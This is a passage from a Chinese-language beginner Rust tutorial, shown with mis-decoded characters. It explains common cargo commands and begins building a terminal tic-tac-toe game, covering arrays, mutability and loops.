powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\Rust<span class="literal">-test</span>\hello&gt; cargo run</span><br><span class="line">   Compiling hello v0.<span class="number">1.0</span> (D:\Rust<span class="literal">-test</span>\hello)</span><br><span class="line">    Finished dev <span class="function">[<span class="type">unoptimized</span> + <span class="type">debuginfo</span>] <span class="title">target</span></span>(s) <span class="keyword">in</span> <span class="number">2.80</span>s</span><br><span class="line">     Running `target\debug\hello.exe`</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><p><strong>check</strong></p><p><code>cargo check</code>åº”è¯¥æ˜¯ä½¿ç”¨é¢‘ç‡æœ€é«˜çš„å‘½ä»¤ä¹‹ä¸€ï¼Œæ— ä»–ï¼Œè°ä¸æ„¿æ„åœ¨å†™ä»£ç çš„æ—¶å€™æœ‰ä¸€ä¸ªå¸®æ‰‹èƒ½å¸®ä½ æ£€æŸ¥ä»£ç å‘¢ã€‚checkå‘½ä»¤å°±æ˜¯ä¼šå¯¹ä½ çš„rustä»£ç åšäº¿ç‚¹ç‚¹æ£€æŸ¥ï¼Œå¦‚æœä½ å†™çš„é—®é¢˜ï¼Œè¿˜ä¼šè´´å¿ƒçš„ç»™äºˆä½ æç¤ºã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// path: src/main.rs</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checkä¸€ä¸‹çœ‹çœ‹</p><p><img src="/Rust-QuickStart/image-20231126150439479.png" alt="check_a"></p><p>è­¦å‘Šäº†ä½ aè¿™ä¸ªå˜é‡æ²¡æœ‰ä½¿ç”¨ï¼Œå¹¶ä¸”ç»™äº†ä½ æç¤ºï¼Œå¯ä»¥åœ¨å˜é‡åå‰é¢åŠ ä¸€ä¸ªä¸‹åˆ’çº¿ï¼Œè¿™æ ·ç¼–è¯‘å™¨å°±ä¸ä¼šè­¦å‘Šè¿™ä¸ªå€¼ï¼Œå½“ç„¶è¿™ä¸ªå€¼è¿˜æ˜¯å¯ä»¥ä½¿ç”¨çš„ã€‚checkçš„åŠŸèƒ½è¿œä¸æ­¢è¿™äº›ï¼Œå¾—è¦é è‡ªå·±æ¢ç´¢äº†ï¼šD</p><p><strong>fmt</strong></p><p>ruståˆä¸€å¤§æ€å™¨ï¼Œé™¤äº†å¯ä»¥å¸®ä½ æ§åˆ¶ä»£ç ç¼©è¿›ï¼Œè¿˜å¯ä»¥å¸®ä½ çš„ä»£ç ä¹¦å†™é£æ ¼å˜å¾—æ›´åŠ rustyï¼</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// path: src/main.rs</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        std::io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> s).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">nums</span> = s.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">split_whitespace</span>().<span class="title function_ invoke__">map</span>(|x| x.parse::&lt;<span class="type">usize</span>&gt;().<span class="title function_ invoke__">unwrap</span>()).collect::&lt;<span class="type">Vec</span>&lt;<span class="type">usize</span>&gt;&gt;();</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, nums);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ<code>cargo fmt</code>å</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    std::io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> s).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">nums</span> = s</span><br><span class="line">        .<span class="title function_ invoke__">trim</span>()</span><br><span class="line">        .<span class="title function_ invoke__">split_whitespace</span>()</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|x| x.parse::&lt;<span class="type">usize</span>&gt;().<span class="title function_ invoke__">unwrap</span>())</span><br><span class="line">        .collect::&lt;<span class="type">Vec</span>&lt;<span class="type">usize</span>&gt;&gt;();</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, nums);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸æ˜¯çœ‹çš„èˆ’æœå¤šäº†ï¼Œæ‰€ä»¥å†ä¹Ÿä¸ç”¨æ‹…å¿ƒé‡æ„æ—¶ä¸€å †ç¼©è¿›é—®é¢˜çš„ï¼ˆbushi</p><p><strong>clippy</strong></p><p>check + fmt + clippyå¤§æ¦‚å°±æ˜¯å†™ä»£ç è¿‡ç¨‹ä¸­æœ€å¸¸ç”¨çš„3ä»¶å¥—äº†ï¼Œå†™rså˜å˜çˆ½~</p><p>clippyç±»ä¼¼äºcheckï¼Œä¼šå¯¹ä½ çš„ä»£ç åšä¸€äº›å¸¸è§é”™è¯¯çš„æ£€æŸ¥ï¼ŒåŒæ—¶ä¹Ÿåƒå‘½ä»¤æè¿°ä¸­è¯´çš„ï¼Œimprove your Rust codeï¼</p><p>å¯¹ä¸Šé¢é‚£æ®µä»£ç åˆ†åˆ«è¿è¡Œcheckå’Œclippyå¯¹æ¯”çœ‹çœ‹</p><p><img src="/Rust-QuickStart/image-20231126151919640.png" alt="check_and_clippy"></p><p>å‘ç°checkæ²¡æœ‰å‘ç°è¯­æ³•é—®é¢˜ï¼Œæ‰€ä»¥æ²¡æœ‰ä»»ä½•ä¿¡æ¯æŠ›å‡ºï¼›è€Œclippyåˆ™æ˜¯åœ¨è¯­æ³•å±‚é¢æä¾›äº†ä¸€ä¸ªç®€å•çš„ä¼˜åŒ–æ–¹æ¡ˆï¼Œæ¯”å¦‚è¿™é‡Œæç¤ºåœ¨<code>.split_whitespace()</code>å‰ä¸éœ€è¦ä½¿ç”¨<code>.trim()</code>ï¼Œ åé¢å…¶å®è¿˜æœ‰ä¸€ä¸ªæç¤ºè¯´å¯ä»¥ç”¨clippyå¸®ä½ æ”¹ï¼Œä¸ç”¨æ‰‹åŠ¨æ”¹ã€‚æˆ‘ä»¬è¿è¡Œä¸€ä¸‹<code>cargo clippy --fix --bin &#39;hello&#39; --allow-dirty</code>ï¼Œ å†å›å»çœ‹æˆ‘ä»¬çš„æºä»£ç ï¼Œæœç„¶<code>.trim()</code>å·²ç»è¢«å»é™¤äº†ã€‚</p><p><strong>others</strong></p><p>è¿˜æœ‰ä¸€äº›ä¸æ˜¯é‚£ä¹ˆçš„å¸¸ç”¨ä½†æ˜¯ä¹Ÿå¾ˆæœ‰ç”¨çš„å‘½ä»¤ï¼Œè¿™é‡Œç®€å•åˆ—ä¸€ä¸‹ï¼š</p><ul><li><code>cargo add</code>  å¯ä»¥æŠŠæŒ‡å®šçš„ä¾èµ–æ·»åŠ åˆ°å½“å‰é¡¹ç›®ï¼Œæ¯”å¦‚<code>cargo add regex</code>ï¼Œå°±å¯ä»¥æŠŠregexåº“æ·»åŠ åˆ°å½“å‰é¡¹ç›®ï¼Œä½¿ç”¨cargo addä¼šä¿®æ”¹ä½ çš„Cargo.tomlæ–‡ä»¶ï¼Œé»˜è®¤æ·»åŠ çš„æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå®ƒçš„ç‰ˆæœ¬å’Œfeatureå•¥çš„ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹cargo.tomlæ–‡ä»¶æ¥è¾¾åˆ°ä¸€æ ·çš„æ•ˆæœ</li><li><code>cargo remove</code> äºcargo addå¯¹åº”ï¼Œå°±æ˜¯æŠŠæŒ‡å®šçš„ä¾èµ–ä»å½“å‰é¡¹ç›®å»é™¤</li><li><code>cargo --version</code> æŸ¥çœ‹cargoçš„ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬æ˜¯stableè¿˜æ˜¯nightly</li><li><code>cargo install</code> çœ‹èµ·æ¥å’Œaddå¾ˆåƒï¼Œä¸è¿‡installå‘½ä»¤æ˜¯å®‰è£…äºŒè¿›åˆ¶æ–‡ä»¶çš„ï¼Œæ¯”å¦‚è¿è¡Œ<code>cargo install tauri-cli</code>ï¼Œç„¶åä½ å°±å¯ä»¥ä½¿ç”¨<code>cargo tauri</code> å‘½ä»¤æ¥æ„å»ºä½ çš„taurié¡¹ç›®ï¼šD</li><li><code>cargo clean</code> è¿™æ˜¯å’Œbuildä¸€å¯¹çš„ï¼Œcleanç”¨æ¥åˆ é™¤<code>./target</code>æ–‡ä»¶å¤¹</li><li><code>cargo search</code> å¯ä»¥åœ¨crates.ioæŸ¥æ‰¾æŒ‡å®šçš„crateï¼Œ<del>è®°å¾—ç§‘å­¦ä¸Šç½‘</del>ï¼Œè¦ä¸ç„¶å¯èƒ½æœ‰äº¿ç‚¹ç‚¹æ…¢ï¼š(</li><li><strong>â€¦â€¦</strong></li></ul><h1 id="Quick-Start-with-a-small-Game"><a href="#Quick-Start-with-a-small-Game" class="headerlink" title="Quick Start with a small Game"></a>Quick Start with a small Game</h1><h2 id="Create-your-Tic-tac-toe"><a href="#Create-your-Tic-tac-toe" class="headerlink" title="Create your Tic-tac-toe"></a>Create your Tic-tac-toe</h2><p>é€šè¿‡ä¸€ä¸ªå°é¡¹ç›®æ¥å¿«é€Ÿä¸Šæ‰‹å¯èƒ½æ˜¯ä¸€ä¸ªå¥½æ–¹æ³•ã€‚</p><p>å…ˆæ‰¾ä¸€ä¸ªä½ è§‰å¾—æ¯”è¾ƒèˆ’æœçš„åœ°æ–¹ï¼Œç„¶åé€šè¿‡cargoæ¥åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®ï¼Œå¹¶ä¸”è¿›å…¥é¡¹ç›®æ–‡ä»¶å¤¹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cargo new tic<span class="literal">-tac-toe</span></span><br><span class="line"><span class="built_in">cd</span> tic<span class="literal">-tac-toe</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ä½ ä½äºå½“å‰é¡¹ç›®çš„æ ¹ç›®å½•ï¼Œä½ éœ€è¦ç¡®ä¿ä½ çš„ç»ˆç«¯çš„å½“å‰ç›®å½•åœ¨é¡¹ç›®æ–‡ä»¶å¤¹å†…ï¼Œä»¥ä¾¿cargoå¯ä»¥å®šä½åˆ°ä½ çš„ <code>cargo.toml</code> æ–‡ä»¶ï¼Œé™¤æ­¤ä¹‹å¤–åœ¨æ ¹ç›®å½•è¿˜æ˜¯åœ¨å…¶ä»–ç›®å½•ï¼ˆæ¯”å¦‚<code>src/</code> æˆ–è€… <code>target/</code> ç­‰ï¼‰æ²¡æœ‰å½±å“</p><p>å¥½ï¼ç°åœ¨ä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç¼–è¾‘å™¨æ¥æ‰“å¼€main.rsæ–‡ä»¶å‡†å¤‡ç¼–å†™é¡¹ç›®äº†ï¼</p><h2 id="Start-with-putting-something"><a href="#Start-with-putting-something" class="headerlink" title="Start with putting something"></a>Start with putting something</h2><p>å“ªæ€•æ˜¯ç»ˆç«¯ï¼Œäº¤äº’ä¹Ÿæ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå‡ ä¹ä»»ä½•è¯­è¨€çš„æ•™ç¨‹æ•™ä½ å†™çš„ç¬¬ä¸€å¥ä»£ç éƒ½ååˆ†é»˜å¥‘çš„é€‰æ‹©äº† Hello, World! <del>ï¼ˆå½“ç„¶åœ¨è¿™é‡Œæˆ‘ä»¬ä¸æ˜¯è¦è¾“å‡ºè¿™å¥è¯å°±æ˜¯äº†ï¼‰</del></p><p>æ‰“å¼€ä½ çš„rsæºæ–‡ä»¶ï¼Œå®ƒåº”è¯¥ä½äº<code>src/main.rs</code>ï¼Œ ä¼šå‘ç°é‡Œé¢å·²ç»æœ‰å†…å®¹äº†ï¼Œé‚£ä¹ˆå¦‚æœä»”ç»†è§‚å¯Ÿä¼šå‘ç°ä½¿ç”¨çš„è¾“å‡º<del>å‡½æ•°</del> <code>println!()</code> å¸¦æœ‰ä¸€ä¸ªï¼ï¼ŒæŒ‰ç†è¯´<code>!</code>å±äºéæ³•å‘½åï¼Œåœ¨rså½“ç„¶ä¹Ÿä¸€æ ·ï¼Œåªæ˜¯å› ä¸ºè¿™ä¸ª<code>!</code>ä¸æ˜¯åŒ…å«åœ¨åå­—å†…çš„ç½¢äº†ï¼Œå¦å¤–ï¼Œprintlnï¼ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯<strong>å®</strong></p><blockquote><p>  åœ¨rusté‡Œï¼Œå¸¦æœ‰ï¼çš„å°±æ˜¯å®äº†ï¼Œæ¯”å¦‚ print!, println!, write!ç­‰ï¼Œæˆ‘ä»¬è¿™é‡Œæš‚æ—¶å…ˆä¸è°ˆå®ï¼Œåªè¦çŸ¥é“æ˜¯ç”¨æ¥è¾“å‡ºçš„å°±è¡Œäº†</p></blockquote><p>æŠŠmainå‡½æ•°é‡Œé¢æ¸…ç©ºï¼Œå¹¶å†™ä¸Šè¿™å¥è¯</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Welcome to Rust Tic Tac Toe!&quot;</span>);</span><br></pre></td></tr></table></figure><p>è®°å¾—è¿è¡Œä¸€ä¸‹ç¡®ä¿èƒ½çœ‹åˆ°è¾“å‡ºè¿™å¥è¯ï¼šD</p><h2 id="Game-initialize"><a href="#Game-initialize" class="headerlink" title="Game initialize"></a>Game initialize</h2><p>ç»†æƒ³ä¸€ä¸ªäº•å­—æ£‹éœ€è¦äº›ä»€ä¹ˆï¼Œå—¯å“¼~ï¼Œæˆ‘æƒ³éœ€è¦ä¸€ä¸ªæ£‹ç›˜ï¼Œä¸¤ä¸ªç©å®¶ï¼Œå½“ç„¶è¿˜æœ‰é…å¥—çš„ä¸€ç³»åˆ—åˆ¤å®šç³»ç»Ÿã€‚é‚£æˆ‘ä»¬å°±å…ˆçœ‹æ£‹ç›˜å§ï¼</p><p>æ£‹ç›˜æ˜¾ç„¶æ˜¯ä¸€ä¸ª3x3çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©åˆ›å»ºä¸€ä¸ª3x3çš„äºŒç»´æ•°ç»„ï¼Œæˆ–è€…é•¿åº¦ä¸º9çš„ä¸€ç»´æ•°ç»„ã€‚è¿™é‡Œä¸ºäº†æ›´åŠ ç¬¦åˆç›´è§‰ï¼Œæˆ‘é€‰æ‹©äº†å‰è€…ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">board</span>: [[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>] = [[<span class="string">&#x27; &#x27;</span>; <span class="number">3</span>]; <span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>åœ¨rustä¸­ä½ å¯ä»¥ä½¿ç”¨letæ¥æŠŠä¸€ä¸ªå€¼ç»‘å®šåˆ°ä¸€ä¸ªå˜é‡ï¼Œå¦‚æœä½ å†™è¿‡JavaScriptï¼Œåº”è¯¥ä¼šæ¯”è¾ƒäº²åˆ‡ï¼šDï¼Œ ä¸€ä¸ªæ ‡å‡†çš„ç”¨æ³•å°±æ˜¯<code>let å˜é‡å: ç±»å‹ = è¡¨è¾¾å¼;</code>ï¼Œ è¿™é‡Œç”±äºrustæœ‰å¼ºå¤§çš„ç±»å‹æ¨å¯¼ç³»ç»Ÿï¼Œæ‰€ä»¥ä½ å¯ä»¥ä¸ç”¨å†™åç±»å‹ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ¨å¯¼å‡ºæ¥ï¼æ‰€ä»¥è™½ç„¶æ˜¯å¼ºç±»å‹è¯­è¨€ï¼Œä½†æ˜¯ä¹Ÿä¸ç”¨åƒC&#x2F;Cppåœ¨åˆ›å»ºå˜é‡æ—¶å¿…é¡»æ³¨æ˜ç±»å‹ã€‚</p><p>æˆ‘ä»¬å†æ¥çœ‹çœ‹è¿™ä¸ªç±»å‹ï¼Œæ˜¯ä¸€ä¸ªåµŒå¥—çš„æ•°ç»„ï¼Œåœ¨rusté‡Œé¢æ•°ç»„æ˜¯<strong>å›ºå®šé•¿åº¦</strong>çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ åœ¨å£°æ˜æ—¶<strong>å¿…é¡»æ˜¾ç¤ºçš„æ ‡æ³¨é•¿åº¦</strong>ï¼Œ è¿™å°±å¯¼è‡´ï¼Œå“ªæ€•æ•°ç»„å†…éƒ¨æ¯ä¸ªå…ƒç´ çš„ç±»å‹ç›¸åŒï¼Œé•¿åº¦ä¸åŒçš„è¯ä¹Ÿæ˜¯ä¸åŒç±»å‹ï¼Œ<strong>æ¯”å¦‚ <code>[u32; 3]</code> å’Œ <code>[u32; 4]</code>å°±æ˜¯ä¸¤ä¸ªä¸åŒçš„ç±»å‹ï¼</strong></p><p>å³è¾¹çš„è¡¨è¾¾å¼å°±å’Œç±»å‹é•¿å¾—å·®ä¸å¤šï¼Œåªè¦æŠŠæ•°ç»„é‡Œé¢çš„ç±»å‹æ›¿æ¢æˆå¯¹äºç±»å‹çš„æŸä¸ªå…·ä½“å€¼å°±è¡Œäº†ï¼Œåƒè¿™é‡Œå°±æ˜¯ä½¿ç”¨äº†ç©ºæ ¼æ¥åˆå§‹åŒ–è¿™ä¸ªæ•°ç»„ã€‚</p><blockquote><p>  ä¸æ˜¯æ‰€æœ‰ç±»å‹éƒ½å¯ä»¥ä½œä¸ºæ•°ç»„çš„å…ƒç´ ï¼Œé™¤éå®ç°Copy traitï¼Œ copyç‰¹å¾ç®€å•æ¥è¯´å°±æ˜¯èƒ½å¤Ÿå¿«é€Ÿæ‹·è´ï¼Œæ€§èƒ½å¼€é”€éå¸¸çš„å°ï¼Œä¸€èˆ¬å‚¨å­˜åœ¨æ ˆä¸Šçš„æ•°æ®éƒ½é»˜è®¤å®ç°äº†Copyç‰¹å¾ï¼›è€ŒåƒStringè¿™ç§åœ¨å †ä¸Šçš„æ•°æ®ï¼Œæ— æ³•å®ç°Copyç‰¹å¾ï¼ˆä½†æ˜¯å®ç°äº†Cloneç‰¹å¾ï¼Œå¯ä»¥ç”¨.clone()æ¥å¤åˆ¶ä¸€ä»½ï¼‰ï¼Œæ‰€ä»¥ä¸èƒ½ä½œä¸ºæ•°ç»„çš„å…ƒç´ ï¼Œåƒ [String; 3]ï¼Œè¿™ç§ç±»å‹æ˜¯ä¸è¢«å…è®¸çš„</p></blockquote><p>é‚£ä¹ˆåœ°å›¾å°±è¿™ä¹ˆå¼„å¥½äº†ï¼Œæˆ‘ä»¬æ¯ä¸‹ä¸€æ­¥ï¼Œå°±åªè¦æŠŠæ•°ç»„å¯¹åº”ä½ç½®çš„charæ¢æˆæˆ‘ä»¬ä¸‹çš„å­—ç¬¦ã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬å‡å®šç©å®¶ä½¿ç”¨ â€˜Xâ€™ å’Œ â€˜Oâ€™ï¼Œ Xå…ˆæ‰‹ã€‚æˆ‘ä»¬å…ˆæ¥æµ‹è¯•ä¸€ä¸‹å§</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">board[<span class="number">0</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span>;</span><br></pre></td></tr></table></figure><p>okï¼Œ éå¸¸å®Œç¾ï¼ç›´æ¥cargo run è¿è¡Œä¸€æ‰‹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   Compiling playground v0.<span class="number">0.1</span> (/playground)</span><br><span class="line">error[<span class="type">E0594</span>]: cannot assign to `board[<span class="type">_</span>][<span class="type">_</span>]`, as `board` is not declared as mutable</span><br><span class="line"> <span class="literal">--</span>&gt; src/main.rs:<span class="number">3</span>:<span class="number">5</span></span><br><span class="line">  |</span><br><span class="line"><span class="number">3</span> |     board[<span class="number">0</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">  |     ^^^^^^^^^^^^^^^^^ cannot assign</span><br><span class="line">  |</span><br><span class="line">help: consider changing this to be mutable</span><br><span class="line">  |</span><br><span class="line"><span class="number">2</span> |     let mut board: [[<span class="built_in">char</span>; <span class="number">3</span>]; <span class="number">3</span>] = [[<span class="string">&#x27; &#x27;</span>; <span class="number">3</span>]; <span class="number">3</span>];</span><br><span class="line">  |         +++</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more information about this error, <span class="keyword">try</span> `rustc <span class="literal">--explain</span> E0594`.</span><br><span class="line">error: could not compile `playground` (bin <span class="string">&quot;playground&quot;</span>) due to previous error</span><br></pre></td></tr></table></figure><p>Oh no! æŠ¥é”™äº†ï¼Œç¼–è¯‘å™¨æé†’æˆ‘ä»¬boardæ²¡æœ‰è¢«å£°æ˜ä¸ºå¯å˜ï¼Œæ‰€ä»¥ä¸èƒ½å†æ¬¡åˆ†é…å€¼ç»™<code>board[_][_]</code>ï¼Œ å½“ç„¶è¿˜è´´å¿ƒçš„ç»™ä½ äº†æç¤ºï¼Œåœ¨boardå‰é¢åŠ ä¸€ä¸ªmutå…³é”®å­—å³å¯</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">board</span>: [[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>] = [[<span class="string">&#x27; &#x27;</span>; <span class="number">3</span>]; <span class="number">3</span>];</span><br><span class="line">board[<span class="number">0</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span>;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹ï¼Œç¼–è¯‘é€šè¿‡ï¼</p><blockquote><p>  åœ¨rustä¸­ç”¨letæ¥å£°æ˜ä¸€ä¸ªå˜é‡é»˜è®¤æ˜¯ä¸å¯å˜çš„ï¼Œå¦‚æœä½ æƒ³è¦èƒ½åœ¨åé¢æ”¹å˜å®ƒçš„å€¼ï¼Œä½ å¿…é¡»ç”¨ mut å…³é”®å­—æ¥æ˜¾ç¤ºçš„å£°æ˜ä¸ºä¸€ä¸ªå¯å˜å˜é‡ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥é‡æ–°ç”¨letæ¥ç»‘å®šï¼Œæ¯”å¦‚ä½ å¯ä»¥åƒè¿™æ ·ï¼š</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = a + <span class="number">1</span>;</span><br></pre></td></tr></table></figure></blockquote><p>ç„¶åæˆ‘ä»¬å¯ä»¥åŠ ä¸€ä¸ªcurrent_playeræ¥è®°å½•å½“å‰çš„ç©å®¶ï¼Œå’Œä¸€ä¸ªinputæ¥å‚¨å­˜ä½ æ¯æ¬¡çš„è¾“å…¥ï¼Œç›®å‰çš„mainåº”è¯¥å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Welcome to Rust Tic Tac Toe!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">board</span> = [[<span class="string">&#x27; &#x27;</span>; <span class="number">3</span>]; <span class="number">3</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">current_player</span> = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">input</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è°ƒç”¨äº†Stringç±»çš„newæ–¹æ³•æ¥ç”³è¯·äº†ä¸€å—å†…å­˜æ¥å‚¨å­˜æˆ‘ä»¬çš„å­—ç¬¦ä¸²ï¼Œå½“ç„¶ç°åœ¨è¿˜æ²¡æœ‰è¯»å…¥ä¸œè¥¿ï¼Œè¿˜æ˜¯ç©ºçš„ã€‚</p><p>okï¼Œè®°å¾—è¿è¡Œç¡®ä¿ä½ çš„ä»£ç æ˜¯æ­£ç¡®çš„</p><h2 id="Game-Update"><a href="#Game-Update" class="headerlink" title="Game Update"></a>Game Update</h2><p>æ¥ä¸‹æ¥å°±è¦æ„å»ºæˆ‘ä»¬æ¸¸æˆçš„ä¸»è¦é€»è¾‘äº†ï¼Œæˆ‘ä»¬è‚¯å®šè¦æ”¾åœ¨ä¸€ä¸ªå¾ªç¯é‡Œé¢ï¼Œç„¶åå½“æœ‰äººè·èƒœï¼Œæˆ–è€…æ£‹ç›˜è¢«å¡«æ»¡ï¼ˆå¹³å±€ï¼‰å°±é€€å‡ºæ¸¸æˆã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ¯æ¬¡å¾ªç¯è¦åšäº›ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>é¦–å…ˆæˆ‘ä»¬è‚¯å®šè¦è¾“å‡ºæˆ‘ä»¬çš„æ£‹ç›˜ï¼Œä¸å¯èƒ½ç›²ä¸‹å§:cry:ï¼Œ æˆ‘ä»¬ä¸å¦¨åˆ›å»ºä¸€ä¸ªå‡½æ•°æ¥åœ¨æ¯æ¬¡å¾ªç¯è¿›è¡Œè°ƒç”¨ã€‚</p><p>æˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªå¾ªç¯ï¼Œè¿™é‡Œæˆ‘æ¯”è¾ƒå€¾å‘ä½¿ç”¨ loopï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥ç”¨while trueï¼ˆå¦‚æœä½¿ç”¨while trueï¼Œç¼–è¯‘å™¨åº”è¯¥ä¼šç»™ä½ ä¸€ä¸ªwarningï¼Œå¹¶å»ºè®®ä½ æ”¹æˆloopï¼‰</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="comment">// todo</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>loopæ”¯æŒå¸¸ç”¨çš„æµç¨‹æ§åˆ¶å¦‚breakç­‰ï¼Œè¿™è·Ÿå¤§éƒ¨åˆ†è¯­è¨€å·®ä¸å¤šï¼Œä¸åšèµ˜è¿°ã€‚</p><h3 id="Definite-a-function-to-put-chessboard"><a href="#Definite-a-function-to-put-chessboard" class="headerlink" title="Definite a function to put chessboard"></a>Definite a function to put chessboard</h3><p>å¦‚æœä»”ç»†è§‚å¯Ÿè¿‡mainå‡½æ•°ï¼Œåº”è¯¥å¯ä»¥çŒœå¾—å‡ºæ¥å£°æ˜ä¸€ä¸ªå‡½æ•°è¦ä½¿ç”¨ <code>fn</code> å…³é”®å­—ï¼Œå…¶å…·ä½“çš„æ ¼å¼æ˜¯ <code>fn 